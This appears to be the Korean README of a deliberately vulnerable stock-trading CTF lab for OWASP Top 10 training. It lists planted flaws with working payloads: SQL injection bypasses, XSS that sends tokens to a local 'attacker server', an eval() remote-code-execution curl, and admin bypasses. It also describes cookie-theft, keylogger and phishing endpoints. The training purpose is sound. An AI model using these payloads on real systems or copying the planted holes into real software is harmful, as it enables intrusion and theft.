# 🔐 Trading CTF Platform

> **⚠️ 경고: 이 애플리케이션은 의도적으로 취약하게 만들어진 보안 교육용 CTF(Capture The Flag) 플랫폼입니다.**
> 
> **절대로 프로덕션 환경에서 사용하지 마세요!**

## 📋 목차

- [개요](#-개요)
- [기술 스택](#-기술-스택)
- [설치 및 실행](#-설치-및-실행)
- [서비스 IA (화면 구성)](#-서비스-ia-화면-구성)
- [모의투자 로직](#-모의투자-로직)
- [OWASP Top 10 2025 취약점 가이드](#-owasp-top-10-2025-취약점)
- [CTF 플래그](#-ctf-플래그)

## 🎯 개요

Yahoo Finance API를 활용한 모의 주식 거래 플랫폼입니다. 
OWASP Top 10 2025 취약점을 학습하기 위한 CTF 교육 목적으로 개발되었습니다.

### 주요 특징

- 📈 **실시간 주식 시세** - Yahoo Finance API 연동
- 💰 **모의 투자** - 1억원 가상 자금으로 실제 주식 매매 연습
- 📊 **포트폴리오 관리** - 보유 종목, 손익 계산
- 📝 **커뮤니티** - 게시판 (공지/자유/Q&A)
- 🎫 **민원 시스템** - 파일 첨부 지원
- 👤 **관리자 패널** - 사용자/게시물/민원/로그 관리
- 🎯 **공격자 서버** - XSS/CSRF 공격 실습용 (port 4000)

## 🛠 기술 스택

| 계층 | 기술 | 버전 |
|------|------|------|
| **Frontend** | React + Vite | 18.x / 4.x |
| **Backend** | Node.js + Express | 18.x / 4.18.x |
| **Database** | MySQL | 8.0 |
| **Container** | Docker + Docker Compose | Latest |
| **Market Data** | Yahoo Finance API | yahoo-finance2 |
| **Scheduler** | node-cron | 3.x |

## 🚀 설치 및 실행

### 사전 요구사항

- Docker Desktop
- Git

### 1. 저장소 클론

```bash
git clone <repository-url>
cd Module_project
```

### 2. Docker Compose로 실행

```bash
docker-compose up --build
```

### 3. 서비스 접속

| 서비스 | URL | 설명 |
|--------|-----|------|
| **Frontend** | http://localhost:3000 | 메인 웹 애플리케이션 |
| **Backend API** | http://localhost:5000 | REST API 서버 |
| **Attacker Server** | http://localhost:4000 | XSS/CSRF 공격 실습 |
| **phpMyAdmin** | http://localhost:8080 | 데이터베이스 관리 |

### 4. 기본 계정

| 역할 | 이메일 | 비밀번호 |
|------|--------|----------|
| 관리자 | admin@kis-trading.com | admin123!@# |
| 일반사용자 | user1@example.com | password123 |
| VIP사용자 | vip@example.com | vip2024! |

## 📱 서비스 IA (화면 구성)

### 사용자 페이지
| 경로 | 설명 |
|------|------|
| `/` | 메인 대시보드 (지수/상승하락/관심종목 요약) |
| `/login`, `/register` | 로그인/회원가입 |
| `/stocks` | 종목 검색 |
| `/stocks/:symbol` | 종목 상세 (현재가 + 차트) |
| `/trade` | 주문 (매수/매도) |
| `/portfolio` | 내 자산 (보유/손익/거래내역) |
| `/board` | 게시판 (공지/자유) |
| `/tickets` | 민원 (작성/조회 + 파일첨부) |

### 관리자 페이지
| 경로 | 설명 |
|------|------|
| `/admin` | 관리자 대시보드 |
| `/admin/users` | 사용자 관리 |
| `/admin/posts` | 게시물 관리 |
| `/admin/tickets` | 민원 처리 |
| `/admin/audit` | 로그 조회 |

## 💹 모의투자 로직

### 초기 자금
- 회원가입 시 **1억원 (₩100,000,000)** 가상 자금 지급

### 주문 유형

#### 시장가 주문 (Market Order)
- Yahoo Finance 현재가로 **즉시 체결**
- 실시간 시세 조회 → 잔고 확인 → 즉시 매매

#### 지정가 주문 (Limit Order)  
- 지정한 가격에 도달하면 체결
- **1분마다 배치 작업**으로 조건 확인
- 매수: 현재가 ≤ 지정가 → 체결
- 매도: 현재가 ≥ 지정가 → 체결

### 손익 계산
```
평가금액 = 현재가(Yahoo) × 보유수량
매입금액 = 평균단가 × 보유수량
손익 = 평가금액 - 매입금액
수익률(%) = (손익 / 매입금액) × 100
```

### API 엔드포인트

#### Market API (v2)
| Method | Endpoint | 설명 |
|--------|----------|------|
| GET | `/api/v2/market/search?q=` | 종목 검색 |
| GET | `/api/v2/market/indices` | 주요 지수 |
| GET | `/api/v2/market/trending` | 인기/상승/하락 |
| GET | `/api/v2/market/:symbol/quote` | 현재가 |
| GET | `/api/v2/market/:symbol/chart` | 차트 데이터 |

#### Trading API (v2)
| Method | Endpoint | 설명 |
|--------|----------|------|
| POST | `/api/v2/trade/order` | 주문 실행 |
| DELETE | `/api/v2/trade/order/:id` | 주문 취소 |
| GET | `/api/v2/trade/orders` | 주문 내역 |
| GET | `/api/v2/trade/portfolio` | 포트폴리오 |
| GET | `/api/v2/trade/balance` | 잔고 조회 |
| POST | `/api/v2/trade/reset` | 모의투자 초기화 |

## � OWASP Top 10 2025 취약점

### 취약점 매핑 및 공격 방법

| 순위 | 취약점 | 구현 위치 | 공격 방법 |
|------|--------|----------|----------|
| **A01** | Broken Access Control | IDOR, 관리자 우회 | [상세 보기](#a01-broken-access-control) |
| **A02** | Security Misconfiguration | CORS, 디버그 모드 | [상세 보기](#a02-security-misconfiguration) |
| **A03** | Software Supply Chain | 취약한 npm 패키지 | [상세 보기](#a03-software-supply-chain) |
| **A04** | Cryptographic Failures | 평문 비밀번호, 약한 JWT | [상세 보기](#a04-cryptographic-failures) |
| **A05** | Injection | SQL Injection, XSS | [상세 보기](#a05-injection) |
| **A06** | Insecure Design | Race Condition | [상세 보기](#a06-insecure-design) |
| **A07** | Authentication Failures | 무제한 로그인, 약한 비밀번호 | [상세 보기](#a07-authentication-failures) |
| **A08** | Data Integrity Failures | eval(), 쿠키 변조 | [상세 보기](#a08-data-integrity-failures) |
| **A09** | Logging & Alerting | 민감정보 로깅 | [상세 보기](#a09-logging--alerting-failures) |
| **A10** | Exceptional Conditions | 에러 시 인증 우회 | [상세 보기](#a10-exceptional-conditions) |

---

### A01: Broken Access Control

**취약점**: 사용자 권한을 넘어선 데이터 열람이나 기능 실행

| 공격 | 엔드포인트 | 페이로드 |
|------|-----------|---------|
| IDOR 프로필 조회 | `GET /api/auth/profile` | `?id=1`, `?id=2`, `?id=3` |
| IDOR 잔고 조회 | `GET /api/v2/trade/balance` | `?user_id=1` |
| IDOR 관심종목 | `GET /api/market/watchlist` | `?user_id=1` |
| 관리자 헤더 우회 | `GET /api/admin/*` | `X-Admin-Key: admin_bypass_key` |

---

### A02: Security Misconfiguration

**취약점**: 서버나 앱의 설정이 취약하게 유지됨

| 공격 | 설명 | 확인 방법 |
|------|------|----------|
| CORS 전체 허용 | 모든 도메인에서 API 호출 가능 | 다른 도메인에서 fetch() |
| 디버그 모드 | 에러 시 스택 트레이스 노출 | 잘못된 요청 전송 |
| 서버 정보 노출 | DB 비밀번호, JWT Secret 노출 | `GET /api/utils/server-info` |

---

### A03: Software Supply Chain

**취약점**: 알려진 취약점이 있는 npm 패키지 사용

```bash
cd backend && npm audit
```

| 패키지 | 버전 | CVE |
|--------|------|-----|
| lodash | 4.17.15 | CVE-2020-8203 (Prototype Pollution) |
| serialize-javascript | 2.1.0 | CVE-2020-7660 (RCE) |
| xml2js | 0.4.19 | CVE-2023-0842 (Prototype Pollution) |
| minimist | 1.2.5 | CVE-2021-44906 (Prototype Pollution) |
| node-fetch | 2.6.0 | CVE-2022-0235 (Info Exposure) |
| underscore | 1.12.0 | CVE-2021-23358 (RCE) |

---

### A04: Cryptographic Failures

**취약점**: 평문 데이터 저장, 약한 암호 알고리즘 사용

| 공격 | 확인 방법 |
|------|----------|
| 평문 비밀번호 | phpMyAdmin에서 `SELECT email, password FROM users` |
| 약한 JWT Secret | `super_secret_key_123` - jwt.io에서 변조 가능 |
| JWT에 민감정보 | 토큰 디코딩 시 password_hash 포함 확인 |

---

### A05: Injection

**취약점**: SQL Injection, XSS

#### SQL Injection
| 공격 | 엔드포인트 | 페이로드 |
|------|-----------|---------|
| 로그인 우회 | `POST /api/auth/login` | `email: admin@kis-trading.com' OR '1'='1' --` |
| UNION 공격 | `GET /api/market/search` | `?q=' UNION SELECT password FROM users--&source=local` |

#### XSS (Stored)
```html
<!-- 게시판 내용에 삽입 -->
<img src=x onerror=alert(1)>

<!-- 토큰 탈취 (공격자 서버로 전송) -->
<img src=x onerror="fetch(`http://localhost:4000/token?t=`+localStorage.getItem(`token`))">
```

---

### A06: Insecure Design

**취약점**: Race Condition (동시성 제어 부재)

```bash
# 잔고 100만원인데 동시에 100만원씩 2번 주문
# 트랜잭션 없이 잔고 확인 → 둘 다 통과 → 잔고 마이너스
curl -X POST http://localhost:5000/api/v2/trade/order \
  -d '{"user_id":1,"symbol":"AAPL","side":"buy","quantity":1000}' &
curl -X POST http://localhost:5000/api/v2/trade/order \
  -d '{"user_id":1,"symbol":"AAPL","side":"buy","quantity":1000}' &
```

---

### A07: Authentication Failures

**취약점**: 인증 단계의 허점

| 공격 | 설명 | 페이로드 |
|------|------|---------|
| 무제한 로그인 | Rate limiting 없음 | 브루트포스 공격 |
| 약한 비밀번호 | 1자리 비밀번호 허용 | `password: "1"` |
| 긴 토큰 유효기간 | 365일 유효 | 탈취 시 장기간 악용 |
| 예측 가능 토큰 | 비밀번호 재설정 토큰 | Base64(email + timestamp) |

---

### A08: Data Integrity Failures

**취약점**: 데이터 변조 방지 실패, 안전하지 않은 역직렬화

#### eval() RCE
```bash
# 계산기 API에서 원격 코드 실행
curl -X POST http://localhost:5000/api/utils/calculate \
  -H "Content-Type: application/json" \
  -d '{"expression": "require(`child_process`).execSync(`whoami`).toString()"}'
```

#### 서명 없는 쿠키 신뢰
```bash
# 잘못된 세션 데이터 전송 시 관리자로 인증됨
curl http://localhost:5000/api/utils/validate-session \
  -H "X-Session-Data: INVALID_BASE64"
```

#### 클라이언트 데이터 신뢰
```bash
# isAdmin을 클라이언트가 보냄
curl -X POST http://localhost:5000/api/utils/run-query \
  -d '{"query": "SELECT * FROM users", "isAdmin": true}'
```

---

### A09: Logging & Alerting Failures

**취약점**: 민감 정보 로깅, 알림 부재

```bash
# 백엔드 로그에 비밀번호 노출
docker logs module_project-backend-1 | grep password

# 로그인 실패에 대한 알림/차단 없음
```

---

### A10: Exceptional Conditions (현실적 시나리오)

**취약점**: 예외 상황에서 비즈니스 로직 우회

#### 🔥 시나리오 1: 무료로 주식 구매하기

**상황**: 시세 조회 API 에러 발생 시 가격이 $0.01로 설정됨

```bash
# 특수문자가 포함된 심볼로 시세 조회 에러 유발
# API가 실패하면 가격이 $0.01이 되어 사실상 무료 구매!

# 1. 로그인하여 토큰 획득
TOKEN=$(curl -s -X POST http://localhost:5000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"user1@example.com","password":"password123"}' | jq -r '.token')

# 2. 특수문자 포함 심볼로 주문 (시세 조회 실패 → $0.01 적용)
curl -X POST http://localhost:5000/api/trade/order \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"symbol": "AAPL$HACK", "side": "buy", "quantity": 10000}'
# 결과: $0.01 × 10000 = $100에 10000주 구매 성공!
```

#### 🔥 시나리오 2: DB 에러로 관리자 로그인

**상황**: 로그인 시 DB 에러 발생하면 비상 관리자 권한 부여

```bash
# SQL 에러를 유발하는 입력
curl -X POST http://localhost:5000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email": "'"'"'", "password": "anything"}'
# 응답: {"message": "Emergency login granted", "debug": "DB_ERROR_BYPASS_ACTIVATED"}
# 관리자 토큰이 발급됨!
```

#### 기존 A10 공격도 유효

```bash
# 존재하지 않는 사용자 → 에러 → 관리자 권한 부여
curl "http://localhost:5000/api/utils/admin-check?userId=99999"

# 서버 정보 노출
curl "http://localhost:5000/api/utils/server-info"
```

---

## 🎯 공격자 서버

XSS/CSRF 공격 실습을 위한 서버가 포함되어 있습니다.

| URL | 기능 |
|-----|------|
| http://localhost:4000 | 탈취된 데이터 대시보드 |
| http://localhost:4000/csrf | CSRF 공격 페이지 모음 |
| http://localhost:4000/steal?cookie=... | 쿠키 탈취 |
| http://localhost:4000/token?token=... | 토큰 탈취 |
| http://localhost:4000/keylog?key=... | 키로거 |
| http://localhost:4000/phish | 피싱 폼 캡처 |

---

## �🚩 CTF 플래그

총 10개의 플래그가 숨겨져 있습니다. 취약점을 발견하고 플래그를 찾으세요!

| 번호 | 취약점 유형 | 포인트 | 힌트 |
|------|------------|--------|------|
| 1 | SQL Injection | 100 | 로그인 또는 검색 기능 |
| 2 | Stored XSS | 100 | 게시판 |
| 3 | IDOR | 100 | 다른 사용자 정보 |
| 4 | Privilege Escalation | 150 | 프로필 수정 |
| 5 | File Upload | 100 | 파일 업로드 |
| 6 | Path Traversal | 150 | 파일 다운로드 |
| 7 | Command Injection | 200 | 파일 처리 |
| 8 | Weak Crypto | 100 | JWT 토큰 |
| 9 | Token Leak | 100 | API 응답 |
| 10 | Admin Bypass | 150 | 관리자 페이지 |

## 📚 학습 자료

- [OWASP Top 10 2025](https://owasp.org/Top10/)
- [취약점 상세 가이드](./VULNERABILITIES.md)

## ⚠️ 면책 조항

이 애플리케이션은 **교육 목적으로만** 사용해야 합니다.

- 실제 시스템에 대한 공격에 사용하지 마세요.
- 프로덕션 환경에 배포하지 마세요.
- 허가 없이 타인의 시스템에 접근하지 마세요.

이 코드를 악의적인 목적으로 사용하여 발생하는 모든 법적 책임은 사용자에게 있습니다.

## 📄 라이선스

MIT License - 교육 목적으로 자유롭게 사용 가능
